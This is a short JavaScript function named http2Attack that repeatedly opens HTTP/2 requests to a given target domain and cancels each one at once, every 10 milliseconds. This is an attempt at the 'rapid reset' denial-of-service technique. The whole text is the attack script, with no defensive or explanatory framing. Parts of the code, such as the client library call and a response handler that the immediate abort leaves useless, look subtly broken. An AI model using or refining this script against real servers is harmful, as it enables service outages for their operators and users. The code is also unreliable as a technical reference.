function http2Attack(targetDomain) {
    const { Client } = require('http2-client');
  
    const client = new Client(`https://${targetDomain}:443`);
  
    function requestAndReset() {
      const request = client.request({
        method: 'GET',
        path: '/',
        headers: {
          ':authority': targetDomain,
          ':scheme': 'https'
        }
      });
  
      request.on('response', (headers) => {
        // You can't set the status code and content length manually
        // as it's controlled by the server. Instead, you can check
        // the response headers and status code here.
        console.log(headers);
      });
  
      request.abort(); // Cancel the request
    }
  
    setInterval(requestAndReset, 10);
  }